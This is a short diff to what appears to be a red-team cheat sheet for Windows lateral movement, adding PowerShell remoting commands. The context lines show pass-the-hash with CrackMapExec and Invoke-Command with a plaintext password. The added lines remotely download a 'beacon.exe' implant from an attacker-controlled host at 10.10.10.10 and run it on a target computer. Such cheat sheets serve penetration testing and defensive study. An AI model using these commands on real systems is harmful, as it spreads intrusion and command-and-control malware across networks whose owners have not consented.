@@ -109,6 +109,8 @@ root@payload$ cme smb 192.168.1.100 -u Administrator -H ":5858d47a41e40b40f294b3
 PS C:\> $SecPassword = ConvertTo-SecureString 'secretpassword' -AsPlainText -Force
 PS C:\> $Cred = New-Object System.Management.Automation.PSCredential('DOMAIN\USERNAME', $SecPassword)
 PS C:\> Invoke-Command -ComputerName DC01 -Credential $Cred -ScriptBlock {whoami}
+PS C:\> New-PSSESSION -NAME PSDC -ComputerName COMPUTER01; Invoke-Command -ComputerName COMPUTER01 -ScriptBlock {whoami}
+PS C:\> Invoke-Command -ComputerName COMPUTER01 -ScriptBlock {powershell Invoke-WebRequest -Uri 'http://10.10.10.10/beacon.exe' -OutFile 'C:\Temp\beacon.exe'; Start-Process -wait C:\Temp\beacon.exe}
 ```
 
 ## WinRM
